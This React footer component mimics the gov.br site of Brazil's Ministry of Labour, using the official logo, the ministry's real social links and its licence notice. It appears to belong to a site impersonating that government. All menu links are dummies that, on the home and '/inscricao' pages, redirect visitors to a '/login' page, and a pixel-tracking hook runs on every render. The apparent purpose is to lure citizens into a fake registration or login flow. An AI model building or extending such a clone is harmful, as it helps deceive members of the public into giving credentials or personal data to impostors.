import React from 'react';
import { ChevronDown, Cookie } from 'lucide-react';
import { useNavigate, useLocation } from 'react-router-dom';
import { usePixelTracking } from '../hooks/usePixelTracking';

const Footer: React.FC = () => {
  usePixelTracking();
  
  const navigate = useNavigate();
  const location = useLocation();

  // Só navega para /login se estiver na página inicial ou inscrição
  const handleLoginNavigation = () => {
    if (location.pathname === '/' || location.pathname === '/inscricao') {
      navigate('/login');
    }
  };

  // Determina se deve aplicar cursor pointer e onClick
  const shouldNavigate = location.pathname === '/' || location.pathname === '/inscricao';
  const clickProps = shouldNavigate ? { onClick: handleLoginNavigation, className: "cursor-pointer" } : {};

  return (
    <footer>
      <div className="text-white py-6" style={{ backgroundColor: '#001a33' }}>
        <div className="container mx-auto px-4">
          <div className="py-3">
            <img 
              alt="Government of Brazil logo showing gov.br in white text" 
              className="w-24" 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png"
            />
          </div>
          <div className="border-t border-gray-600"></div>
          <nav>
            <ul className="text-sm">
              <li className="py-3">
                <a 
                  href="#" 
                  className="text-sm hover:underline"
                  {...clickProps}
                >
                  SOBRE O MINISTÉRIO
                </a>
              </li>
              <li className="border-t border-gray-600 py-3 flex justify-between items-center">
                <a 
                  href="#" 
                  className="text-sm hover:underline"
                  {...clickProps}
                >
                  SERVIÇOS DO PROGRAMA
                </a>
                <ChevronDown className="w-4 h-4" />
              </li>
              <li className="border-t border-gray-600 py-3 flex justify-between items-center">
                <a 
                  href="#" 
                  className="text-sm hover:underline"
                  {...clickProps}
                >
                  NAVEGAÇÃO POR PÚBLICO
                </a>
                <ChevronDown className="w-4 h-4" />
              </li>
              <li className="border-t border-gray-600 py-3 flex justify-between items-center">
                <a 
                  href="#" 
                  className="text-sm hover:underline"
                  {...clickProps}
                >
                  ACESSIBILIDADE
                </a>
                <ChevronDown className="w-4 h-4" />
              </li>
              <li className="border-t border-gray-600 py-3 flex justify-between items-center">
                <a 
                  href="#" 
                  className="text-sm hover:underline"
                  {...clickProps}
                >
                  ACESSO À INFORMAÇÃO
                </a>
                <ChevronDown className="w-4 h-4" />
              </li>
              <li className="border-t border-gray-600 py-3 flex justify-between items-center">
                <a 
                  href="#" 
                  className="text-sm hover:underline"
                  {...clickProps}
                >
                  CENTRAIS DE CONTEÚDO
                </a>
                <ChevronDown className="w-4 h-4" />
              </li>
              <li className="border-t border-gray-600 py-3 flex justify-between items-center">
                <a 
                  href="#" 
                  className="text-sm hover:underline"
                  {...clickProps}
                >
                  CANAIS DE ATENDIMENTO
                </a>
                <ChevronDown className="w-4 h-4" />
              </li>
              <li className="border-t border-gray-600 py-3 flex justify-between items-center">
                <a 
                  href="#" 
                  className="text-sm hover:underline"
                  {...clickProps}
                >
                  PROGRAMAS E PROJETOS
                </a>
                <ChevronDown className="w-4 h-4" />
              </li>
            </ul>
          </nav>
          
          <div className="mt-4 flex items-center">
            <Cookie className="w-6 h-6 mr-2" />
            <span 
              className={`text-sm hover:underline ${shouldNavigate ? 'cursor-pointer' : ''}`}
              {...clickProps}
            >
              Redefinir Cookies
            </span>
          </div>

          <div className="mt-6">
            <div className="mb-3">
              <div className="text-sm font-bold mb-3">Redes sociais</div>
              <ul className="flex space-x-2">
                <li>
                  <a href="https://x.com/mintrabalhobr" aria-label="X" className="flex items-center justify-center w-8 h-8 bg-opacity-20 bg-white rounded-full">
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
                    </svg>
                  </a>
                </li>
                <li>
                  <a href="https://www.facebook.com/trabalhoeemprego/" aria-label="Facebook" className="flex items-center justify-center w-8 h-8 bg-opacity-20 bg-white rounded-full">
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path>
                    </svg>
                  </a>
                </li>
                <li>
                  <a href="https://www.youtube.com/c/canaltrabalho" aria-label="YouTube" className="flex items-center justify-center w-8 h-8 bg-opacity-20 bg-white rounded-full">
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"></path>
                    </svg>
                  </a>
                </li>
                <li>
                  <a href="https://br.linkedin.com/company/minist-rio-do-trabalho-e-emprego" aria-label="LinkedIn" className="flex items-center justify-center w-8 h-8 bg-opacity-20 bg-white rounded-full">
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path>
                    </svg>
                  </a>
                </li>
              </ul>
            </div>
            
            <div className="mt-4">
              <a href="https://www.gov.br/acessoainformacao/pt-br" title="Acesse o portal sobre o acesso à informação">
                <div className="flex items-center">
                  <div className="bg-blue-600 rounded-full w-10 h-10 flex items-center justify-center mr-2">
                    <svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"></path>
                    </svg>
                  </div>
                  <div className="text-white text-xs font-bold leading-tight">
                    ACESSO À<br />INFORMAÇÃO
                  </div>
                </div>
              </a>
            </div>
          </div>
        </div>
      </div>
      
      <div className="py-3" style={{ backgroundColor: '#001a33' }}>
        <div className="container mx-auto px-4">
          <div className="text-xs text-white">
            Todo o conteúdo deste site está publicado sob a licença{' '}
            <a 
              rel="license" 
              href="https://creativecommons.org/licenses/by-nd/3.0/deed.pt_BR" 
              className="text-blue-400 hover:text-blue-300"
            >
              Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada
            </a>.
          </div>
        </div>
      </div>
    </footer>
  );
};

export default Footer;